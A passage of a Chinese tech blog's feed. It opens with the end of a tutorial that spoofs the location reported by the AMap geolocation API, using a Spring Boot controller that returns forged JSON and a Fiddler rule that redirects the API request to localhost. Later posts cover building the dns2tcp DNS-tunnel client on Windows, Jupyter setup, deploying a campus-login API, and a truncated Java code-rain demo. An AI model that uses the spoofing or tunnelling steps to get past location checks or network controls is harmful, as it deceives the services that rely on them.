&apos;116.330383,40.008245&apos;, &apos;direction&apos;: &apos;西南&apos;, &apos;distance&apos;: &apos;298.527&apos;, &apos;street&apos;: &apos;荷清路&apos;&#125;, &apos;country&apos;: &apos;中国&apos;, &apos;township&apos;: &apos;清华园街道&apos;, &apos;businessAreas&apos;: [&#123;&apos;location&apos;: &apos;116.341578,39.991180&apos;, &apos;name&apos;: &apos;五道口&apos;, &apos;id&apos;: &apos;110108&apos;&#125;], &apos;building&apos;: &#123;&apos;name&apos;: [], &apos;type&apos;: []&#125;, &apos;neighborhood&apos;: &#123;&apos;name&apos;: &apos;清华大学&apos;, &apos;type&apos;: &apos;科教文化服务;科研机构;科研机构&apos;&#125;, &apos;citycode&apos;: &apos;010&apos;&#125;, &apos;formatted_address&apos;: &apos;北京市海淀区清华园街道清华大学&apos;&#125;, &apos;info&apos;: &apos;OK&apos;, &apos;infocode&apos;: &apos;10000&apos;&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="编写服务器端应用模拟响应报文"><a href="#编写服务器端应用模拟响应报文" class="headerlink" title="编写服务器端应用模拟响应报文"></a>编写服务器端应用模拟响应报文</h3><p>我使用的是<code>IDE</code>是<code>IntelliJ IDEA 2019.3.3</code>，编程语言是<code>java</code>，另外使用了<code>springboot</code>框架快速构建服务器端应用，当然，你可以选择你熟悉的其他方式，不再赘述相关内容，在此直接贴出<code>controller</code>类的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wiki.zimo.demo.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/v3/geocode/regeo"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">locate</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            @RequestParam(<span class="string">"key"</span>)</span> String key,</span></span><br><span class="line"><span class="function">            @<span class="title">RequestParam</span><span class="params">(<span class="string">"s"</span>)</span> String s,</span></span><br><span class="line"><span class="function">            @<span class="title">RequestParam</span><span class="params">(<span class="string">"language"</span>)</span> String language,</span></span><br><span class="line"><span class="function">            @<span class="title">RequestParam</span><span class="params">(<span class="string">"location"</span>)</span> String location,</span></span><br><span class="line"><span class="function">            @<span class="title">RequestParam</span><span class="params">(<span class="string">"extensions"</span>)</span> String extensions,</span></span><br><span class="line"><span class="function">            @<span class="title">RequestParam</span><span class="params">(<span class="string">"callback"</span>)</span> String callback,</span></span><br><span class="line"><span class="function">            @<span class="title">RequestParam</span><span class="params">(<span class="string">"platform"</span>)</span> String platform,</span></span><br><span class="line"><span class="function">            @<span class="title">RequestParam</span><span class="params">(<span class="string">"logversion"</span>)</span> String logversion,</span></span><br><span class="line"><span class="function">            @<span class="title">RequestParam</span><span class="params">(<span class="string">"appname"</span>)</span> String appname,</span></span><br><span class="line"><span class="function">            @<span class="title">RequestParam</span><span class="params">(<span class="string">"csid"</span>)</span> String csid,</span></span><br><span class="line"><span class="function">            @<span class="title">RequestParam</span><span class="params">(<span class="string">"sdkversion"</span>)</span> String sdkversion,</span></span><br><span class="line"><span class="function">            HttpServletResponse response) <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        response.addHeader(<span class="string">"Date"</span>, <span class="keyword">new</span> Date().toGMTString());</span><br><span class="line">        response.addHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/json;charset=utf-8"</span>);</span><br><span class="line">        response.addHeader(<span class="string">"Connection"</span>, <span class="string">"close"</span>);</span><br><span class="line">        response.addHeader(<span class="string">"gsid"</span>, <span class="string">"011018245168159885414704300017308414815"</span>);</span><br><span class="line">        response.addHeader(<span class="string">"sc"</span>, <span class="string">"0.004"</span>);</span><br><span class="line">        response.addHeader(<span class="string">"Access-Control-Allow-Origin"</span>, <span class="string">"*"</span>);</span><br><span class="line">        response.addHeader(<span class="string">"Access-Control-Allow-Methods"</span>, <span class="string">"*"</span>);</span><br><span class="line">        response.addHeader(<span class="string">"Access-Control-Allow-Headers"</span>, <span class="string">"DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,key,x-biz,x-info,platinfo,encr,enginever,gzipped,poiid"</span>);</span><br><span class="line">        response.addHeader(<span class="string">"Server"</span>, <span class="string">"Tengine"</span>);</span><br><span class="line">        <span class="comment">// 下面的json就是你想要伪装的位置</span></span><br><span class="line">        String json = <span class="string">"&#123;'status': '1', 'regeocode': &#123;'addressComponent': &#123;'city': [], 'province': '北京市', 'adcode': '110108', 'district': '海淀区', 'towncode': '110108014000', 'streetNumber': &#123;'number': '7号', 'location': '116.330383,40.008245', 'direction': '西南', 'distance': '298.527', 'street': '荷清路'&#125;, 'country': '中国', 'township': '清华园街道', 'businessAreas': [&#123;'location': '116.341578,39.991180', 'name': '五道口', 'id': '110108'&#125;], 'building': &#123;'name': [], 'type': []&#125;, 'neighborhood': &#123;'name': '清华大学', 'type': '科教文化服务;科研机构;科研机构'&#125;, 'citycode': '010'&#125;, 'formatted_address': '北京市海淀区清华园街道清华大学'&#125;, 'info': 'OK', 'infocode': '10000'&#125;"</span>;</span><br><span class="line">        response.getWriter().write(callback + String.format(<span class="string">"(%s)"</span>, json));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修改fiddler自定义规则"><a href="#修改fiddler自定义规则" class="headerlink" title="修改fiddler自定义规则"></a>修改fiddler自定义规则</h3><p>修改<code>fiddler</code>的自定义规则（快捷键 <kbd>Ctrl</kbd> + <kbd>R</kbd>），使之劫持请求定位的接口<code>https://restapi.amap.com/v3/geocode/regeo</code>将它定向到请求我们自己编写的模拟响应报文的服务器端应用，从而实现伪装定位的目的，脚本如下（此处我是在<code>OnBeforeRequest</code>方法的最后插入了下面这段脚本，当然，也可以处理其他的，比如处理响应之前的）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var origin_host=&quot;https://restapi.amap.com/v3/geocode/regeo&quot;;</span><br><span class="line">var replace_host=&quot;http://localhost:8080/v3/geocode/regeo&quot;;</span><br><span class="line">if(oSession.uriContains(origin_host))&#123;</span><br><span class="line">    oSession.fullUrl = oSession.fullUrl.Replace(origin_host,replace_host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="下面定位到天安门试试"><a href="#下面定位到天安门试试" class="headerlink" title="下面定位到天安门试试"></a>下面定位到天安门试试</h3><p>修改服务器端应用，将<code>json</code>替换为你想定位到的地方，并且需要保证是合法的高德地图定位接口所返回的内容，我这里提供一段<code>python</code>脚本，主要功能是利用<code>高德地图的地理/逆地理编码api</code>得到合法的<code>json</code>位置，使用前需要安装<code>python</code>和<code>requests</code>库，参考命令<code>pip install requests</code>，并申请高德地图<code>Web服务</code>应用，获取到相应的<code>key</code>（注意：这个<code>key</code>和上面的<code>Web端</code>的<code>key</code>并不相同）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># location 就是你想定位到的经纬度坐标，可以使用坐标拾取系统得到</span></span><br><span class="line">res = requests.get(<span class="string">'https://restapi.amap.com/v3/geocode/regeo?key=你的key&amp;location=116.403963,39.915119'</span>)</span><br><span class="line">print(res.json())</span><br></pre></td></tr></table></figure><p>浏览器<code>console</code>输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;complete&quot;,&quot;info&quot;:&quot;SUCCESS&quot;,&quot;status&quot;:1,&quot;ZDa&quot;:&quot;jsonp_590192_&quot;,&quot;position&quot;:&#123;&quot;Q&quot;:30.58052,&quot;R&quot;:103.9923,&quot;lng&quot;:103.9923,&quot;lat&quot;:30.58052&#125;,&quot;message&quot;:&quot;Get ipLocation success.Get address success.&quot;,&quot;location_type&quot;:&quot;ip&quot;,&quot;accuracy&quot;:null,&quot;isConverted&quot;:true,&quot;addressComponent&quot;:&#123;&quot;citycode&quot;:&quot;010&quot;,&quot;adcode&quot;:&quot;110101&quot;,&quot;businessAreas&quot;:[&#123;&quot;name&quot;:&quot;东单&quot;,&quot;id&quot;:&quot;110101&quot;,&quot;location&quot;:&#123;&quot;Q&quot;:39.913479,&quot;R&quot;:116.41680400000001,&quot;lng&quot;:116.416804,&quot;lat&quot;:39.913479&#125;&#125;,&#123;&quot;name&quot;:&quot;王府井&quot;,&quot;id&quot;:&quot;110101&quot;,&quot;location&quot;:&#123;&quot;Q&quot;:39.913505,&quot;R&quot;:116.41203100000001,&quot;lng&quot;:116.412031,&quot;lat&quot;:39.913505&#125;&#125;,&#123;&quot;name&quot;:&quot;东四&quot;,&quot;id&quot;:&quot;110101&quot;,&quot;location&quot;:&#123;&quot;Q&quot;:39.929561,&quot;R&quot;:116.42517099999998,&quot;lng&quot;:116.425171,&quot;lat&quot;:39.929561&#125;&#125;],&quot;neighborhoodType&quot;:&quot;&quot;,&quot;neighborhood&quot;:&quot;&quot;,&quot;building&quot;:&quot;&quot;,&quot;buildingType&quot;:&quot;&quot;,&quot;street&quot;:&quot;东华门大街&quot;,&quot;streetNumber&quot;:&quot;60号&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;province&quot;:&quot;北京市&quot;,&quot;city&quot;:&quot;&quot;,&quot;district&quot;:&quot;东城区&quot;,&quot;township&quot;:&quot;东华门街道&quot;&#125;,&quot;formattedAddress&quot;:&quot;北京市东城区东华门街道东华门大街东华门大街小区&quot;,&quot;roads&quot;:[],&quot;crosses&quot;:[],&quot;pois&quot;:[]&#125;</span><br></pre></td></tr></table></figure><p>详细地址如下：</p><p><img src="/posts/e2047c6/2020-10-22-15-11-31.png" alt="enjoy it"></p><h4 id="百度地图同理，不再过多赘述"><a href="#百度地图同理，不再过多赘述" class="headerlink" title="百度地图同理，不再过多赘述"></a>百度地图同理，不再过多赘述</h4><h4 id="enjoy-it"><a href="#enjoy-it" class="headerlink" title="enjoy it!!!"></a>enjoy it!!!</h4><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;工具及用途&quot;&gt;&lt;a href=&quot;#工具及用途&quot; class=&quot;headerlink&quot; title=&quot;工具及用途&quot;&gt;&lt;/a&gt;工具及用途&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;code&gt;fiddler&lt;/code&gt;抓包，分析网络流量，劫持请求和响应&lt;/li&gt;
&lt;li&gt;一个好用的
      
    
    </summary>
    
      <category term="爬虫" scheme="https://blog.zimo.wiki/categories/%E7%88%AC%E8%99%AB/"/>
    
      <category term="抓包" scheme="https://blog.zimo.wiki/categories/%E7%88%AC%E8%99%AB/%E6%8A%93%E5%8C%85/"/>
    
    
      <category term="fiddler" scheme="https://blog.zimo.wiki/tags/fiddler/"/>
    
      <category term="劫持" scheme="https://blog.zimo.wiki/tags/%E5%8A%AB%E6%8C%81/"/>
    
      <category term="伪装位置" scheme="https://blog.zimo.wiki/tags/%E4%BC%AA%E8%A3%85%E4%BD%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>windows下编译dns2tcp</title>
    <link href="https://blog.zimo.wiki/posts/b33186a1/"/>
    <id>https://blog.zimo.wiki/posts/b33186a1/</id>
    <published>2020-09-28T01:24:48.000Z</published>
    <updated>2022-05-04T02:56:01.382Z</updated>
    
    <content type="html"><![CDATA[<h2 id="dns2tcp简介"><a href="#dns2tcp简介" class="headerlink" title="dns2tcp简介"></a>dns2tcp简介</h2><p>dns2tcp是一款在linux下使用C语言开发的建立dns隧道的开源工具，项目开源地址：<a href="https://github.com/alex-sector/dns2tcp" target="_blank" rel="noopener">https://github.com/alex-sector/dns2tcp</a></p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>用源代码编译出可在windows下运行的dns2tcp的客户端</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ol><li><a href="https://git-scm.com/download/win" target="_blank" rel="noopener">git</a></li><li><a href="https://sourceforge.net/projects/dev-cpp/" target="_blank" rel="noopener">Dev C++</a></li></ol><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><ol><li><p>安装<code>git</code></p></li><li><p>安装<code>Dev C++</code></p></li><li><p>将<code>Dev C++</code>自带的<code>mingw64</code>的工具目录加入到<code>path</code>环境变量中<br> <img src="/posts/b33186a1/2020-09-28-09-40-19.png" alt="path中加入mingw64"></p></li><li><p>在你喜欢的目录，右键，<code>git bash here</code> ，<code>clone</code> 项目到本地</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/alex-sector/dns2tcp.git</span><br></pre></td></tr></table></figure></li><li><p>进入到<code>dns2tcp</code>目录</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd dns2tcp</span><br></pre></td></tr></table></figure></li><li><p>执行<code>configure</code>，生成<code>MakeFile</code>，等待命令执行完成之后，进入下一步</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br></pre></td></tr></table></figure></li><li><p>进入到<code>client</code>目录</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd client</span><br></pre></td></tr></table></figure></li><li><p>make，在Dev C++自带的<code>mingw64</code>的工具中叫<code>mingw32-make</code></p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mingw32-make</span><br></pre></td></tr></table></figure></li><li><p>不出意外的话，<code>client</code>目录下应该会出现编译好的<code>dns2tcpc.exe</code>文件</p></li><li><p>enjoy it!!!</p></li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;dns2tcp简介&quot;&gt;&lt;a href=&quot;#dns2tcp简介&quot; class=&quot;headerlink&quot; title=&quot;dns2tcp简介&quot;&gt;&lt;/a&gt;dns2tcp简介&lt;/h2&gt;&lt;p&gt;dns2tcp是一款在linux下使用C语言开发的建立dns隧道的开源工具，项目开源
      
    
    </summary>
    
      <category term="windows" scheme="https://blog.zimo.wiki/categories/windows/"/>
    
    
      <category term="dns2tcp" scheme="https://blog.zimo.wiki/tags/dns2tcp/"/>
    
      <category term="windows" scheme="https://blog.zimo.wiki/tags/windows/"/>
    
      <category term="编译" scheme="https://blog.zimo.wiki/tags/%E7%BC%96%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>jupyter初体验</title>
    <link href="https://blog.zimo.wiki/posts/952deeaf/"/>
    <id>https://blog.zimo.wiki/posts/952deeaf/</id>
    <published>2020-09-17T12:22:01.000Z</published>
    <updated>2022-05-04T02:56:01.374Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>Jupyter Notebook是一个非常好用的交互式笔记写作应用，支持运行 40 多种编程语言。本质上是一个 Web 应用程序，便于创建和共享文学化程序文档，支持实时代码，数学方程，可视化和 markdown。 用途包括：数据清理和转换，数值模拟，统计建模，机器学习等等</p></blockquote><p>这篇文章将介绍windows10操作系统下Jupyter Notebook的基本使用，包括，安装，配置，常用快捷键，常用语法等</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>直接使用命令<code>pip install jupyterlab -i https://mirrors.aliyun.com/pypi/simple</code></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>使用Jupyter Notebook之前，建议先配置python虚拟环境，参考步骤如下（当然，这是可选的，换言之，你可以不接受这个建议）：</p><ol><li><p>安装，命令<code>pip install virtualenvwrapper-win -i https://mirrors.aliyun.com/pypi/simple</code></p></li><li><p>自定义安装的虚拟环境路径（可选），配置环境变量WORKON_HOME指向自定义的目录即可</p></li><li><p>创建虚拟环境，命令<code>mkvirtualenv env_name</code></p></li><li><p>退出虚拟环境，命令<code>deactivate</code></p></li><li><p>其他常用命令</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">workon 查看所有虚拟环境</span><br><span class="line">workon env_name 切入该虚拟环境</span><br></pre></td></tr></table></figure></li><li><p>装虚拟环境有什么用？其实这就相当于在pycharm里面新建工程一样，便于管理该项目的依赖等</p></li></ol><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ol><li>命令行执行<code>jupyter notebook</code>即可自动弹出浏览器界面</li><li>摸索中</li><li>由于内容太多，不打算继续写下去了，可参考<a href="https://www.jianshu.com/p/91365f343585" target="_blank" rel="noopener">https://www.jianshu.com/p/91365f343585</a></li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Jupyter Notebook是一个非常好用的交互式笔记写作应用，支持运行 40 多种编程语言。本质上是一个 W
      
    
    </summary>
    
      <category term="机器学习" scheme="https://blog.zimo.wiki/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="python" scheme="https://blog.zimo.wiki/tags/python/"/>
    
      <category term="Jupyter Notebook" scheme="https://blog.zimo.wiki/tags/Jupyter-Notebook/"/>
    
      <category term="virtualenvwrapper-win" scheme="https://blog.zimo.wiki/tags/virtualenvwrapper-win/"/>
    
      <category term="机器学习" scheme="https://blog.zimo.wiki/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>从零开始 部署 wisedu-unified-login-api</title>
    <link href="https://blog.zimo.wiki/posts/6c809f81/"/>
    <id>https://blog.zimo.wiki/posts/6c809f81/</id>
    <published>2020-08-21T03:30:59.000Z</published>
    <updated>2022-05-04T02:56:01.386Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>前段时间写了模拟登陆金智教务统一登陆系统的API项目，<a href="https://github.com/ZimoLoveShuang/wisedu-unified-login-api" target="_blank" rel="noopener">GitHub传送门</a>，初始想法是爬金智教务系统，比如获取成绩单等信息，后几经更新，做成了可以完成金智统一认证系统的api，功能更为强大，支持几乎所有接入金智的教务系统，这篇文章就针对目前常见的几种服务器操作系统（windows server、ubantu、centos7），来教大家部署api</p></blockquote><h2 id="申明"><a href="#申明" class="headerlink" title="申明"></a>申明</h2><blockquote><p>在教程开始之前，有必要做个申明，如果你不愿意遵守这个申明，ok，请你离开</p></blockquote><ol><li>不允许使用此项目提供付费的代挂服务，或者任意的收费行为，自愿捐赠除外</li><li>请尽量让使用者去GitHub给我点个star，以示对原作者的尊重</li></ol><h2 id="教程开始"><a href="#教程开始" class="headerlink" title="教程开始"></a>教程开始</h2><h3 id="windows-server"><a href="#windows-server" class="headerlink" title="windows server"></a>windows server</h3><h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><blockquote><p>需要以下环境，某盘链接：<a href="https://pan.baidu.com/s/1aCfxoIfFc89epLEWzvP7Ug" target="_blank" rel="noopener">https://pan.baidu.com/s/1aCfxoIfFc89epLEWzvP7Ug</a><br>提取码：rodq</p></blockquote><ol><li>jdk 1.8</li><li>tessdata</li><li>tomcat 9.0.37</li></ol><h4 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h4><ol><li>安装jdk，并配置环境变量<br> 1.1 安装没什么好说的，全部默认下一步即可<br> 1.2 配置环境变量，参考<code>环境变量_windows</code><br> <img src="/posts/6c809f81/2020-08-21-11-57-57.png" alt="新建JAVA_HOME"><br> <img src="/posts/6c809f81/2020-08-21-11-57-31.png" alt="新建classpath"><br> <img src="/posts/6c809f81/2020-08-21-11-58-37.png" alt="修改path"><br> 1.3 验证，打开cmd，输入<code>java -version</code><br> <img src="/posts/6c809f81/2020-08-21-11-59-37.png" alt="验证Java"></li><li>配置TESSDATA_PREFIX环境变量，指向tessdata文件夹<br><img src="/posts/6c809f81/2020-08-21-12-00-26.png" alt="新建TESSDATA_PREFIX"></li><li>部署<br> 3.1 如果你用jar包，那你打开cmd，执行命令<code>java -jar wisedu-unified-login-api-v1.0.jar &amp;</code>，然后就到第4步测试<br> 3.2 如果你使用war包，那你需要解压tomcat到一个可操作（有写入和读取权限）的目录，推荐C:\Users\Public<br> <img src="/posts/6c809f81/2020-08-21-12-03-25.png" alt="解压tomcat"><br> 然后将war包，放入<code>tomcat/webapps</code>目录下，进入<code>tomcat/bin</code>目录下，双击startup.bat</li><li>测试，打开浏览器，访问<a href="http://localhost:8080/wisedu-unified-login-api-v1.0/swagger-ui.html" target="_blank" rel="noopener">http://localhost:8080/wisedu-unified-login-api-v1.0/swagger-ui.html</a><br><img src="/posts/6c809f81/2020-08-21-12-08-02.png" alt="测试是否部署成功"></li><li>enjoy it!!!</li></ol><h3 id="ubantu"><a href="#ubantu" class="headerlink" title="ubantu"></a>ubantu</h3><ol><li>安装open-jdk-8，命令<code>sudo apt install openjdk-8-jdk</code></li><li>安装tesseract-ocr，参考<a href="https://blog.zimo.wiki/posts/c417f07b/">ubantu配置安装tesseract-ocr</a></li><li>部署<br> 3.1 如果你用jar包，直接执行命令<code>java -jar wisedu-unified-login-api-v1.0.jar &amp;</code>，然后就到第4步测试<br> 3.2 如果你使用war包，那你需要解压tomcat到一个可操作（有写入和读取权限）的目录，推荐<code>~/</code><br> 然后将war包，放入<code>tomcat/webapps</code>目录下，进入<code>tomcat/bin</code>目录下，执行<code>./startup.sh</code>，如果提示没有执行权限，请执行<code>sudo chmod 777 *.sh</code>修改权限</li><li>测试，命令<code>curl localhost:8080/wisedu-unified-login-api-v1.0/swagger-ui.html</code>，如果提示未找到curl命令，请执行<code>sudo apt install curl</code>安装<br><img src="/posts/6c809f81/2020-08-21-12-16-22.png" alt="测试是否部署成功"></li><li>enjoy it!!!</li></ol><h3 id="centos7"><a href="#centos7" class="headerlink" title="centos7"></a>centos7</h3><ol><li>安装open-jdk-8，命令<code>sudo yum install java-1.8.0-openjdk</code></li><li>安装tesseract-ocr，参考<a href="https://blog.zimo.wiki/posts/c417f07b/">ubantu配置安装tesseract-ocr</a></li><li>部署<br> 3.1 如果你用jar包，直接执行命令<code>java -jar wisedu-unified-login-api-v1.0.jar &amp;</code>，然后就到第4步测试<br> 3.2 如果你使用war包，那你需要解压tomcat到一个可操作（有写入和读取权限）的目录，推荐<code>~/</code><br> 然后将war包，放入<code>tomcat/webapps</code>目录下，进入<code>tomcat/bin</code>目录下，执行<code>./startup.sh</code>，如果提示没有执行权限，请执行<code>sudo chmod 777 *.sh</code>修改权限</li><li>测试，命令<code>curl localhost:8080/wisedu-unified-login-api-v1.0/swagger-ui.html</code><br><img src="/posts/6c809f81/2020-08-21-12-16-22.png" alt="测试是否部署成功"></li><li>enjoy it!!!</li></ol><p>注意：<strong>如果要开放外网访问，需要在web控制台配置防火墙开放tcp 8080端口，如果是centos7，还需要操作centos中的防火墙，参考<a href="https://jingyan.baidu.com/article/5552ef4796f55e518efbc94f.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/5552ef4796f55e518efbc94f.html</a></strong></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;前段时间写了模拟登陆金智教务统一登陆系统的API项目，&lt;a href=&quot;https://github.com/Zi
      
    
    </summary>
    
      <category term="随笔" scheme="https://blog.zimo.wiki/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="部署" scheme="https://blog.zimo.wiki/tags/%E9%83%A8%E7%BD%B2/"/>
    
      <category term="java" scheme="https://blog.zimo.wiki/tags/java/"/>
    
      <category term="jar" scheme="https://blog.zimo.wiki/tags/jar/"/>
    
      <category term="war" scheme="https://blog.zimo.wiki/tags/war/"/>
    
      <category term="windows server" scheme="https://blog.zimo.wiki/tags/windows-server/"/>
    
      <category term="linux server" scheme="https://blog.zimo.wiki/tags/linux-server/"/>
    
  </entry>
  
  <entry>
    <title>手把手带你用Java写出炫酷的黑客帝国代码雨效果</title>
    <link href="https://blog.zimo.wiki/posts/a49748b4/"/>
    <id>https://blog.zimo.wiki/posts/a49748b4/</id>
    <published>2020-08-10T10:30:58.000Z</published>
    <updated>2022-05-04T02:56:01.402Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>相信大家都看过黑客帝国，里面炫酷的代码雨一定给大家留下了深刻的印象，今天，博主就带大家用Java来实现这个特效，提前剧透，博主将在这篇博文里写下超详细的实现思路，相信即便是小白也能够看懂，下面我们开始</p></blockquote><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol><li>jdk1.8+</li><li>java ide，如idea，或者eclipse</li></ol><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>首先确定我们要做的是一个窗体应用程序，在窗体中使用画布，画出我们的代码雨，而java中的窗体应用只需要继承JFrame类即可</p></li><li><p>JFrame只是单纯的窗体容器，而画布，包含在JPanel组件中，现在我们需要将窗体和画布的大小都设置为电脑屏幕的大小，而除了大小之外，我们还需要对窗体进行一系列的设置，比如不显示标题栏，背景为黑色，鼠标不可见，按esc键退出程序等等，完成这些设置之后，我们的代码是这样的：</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 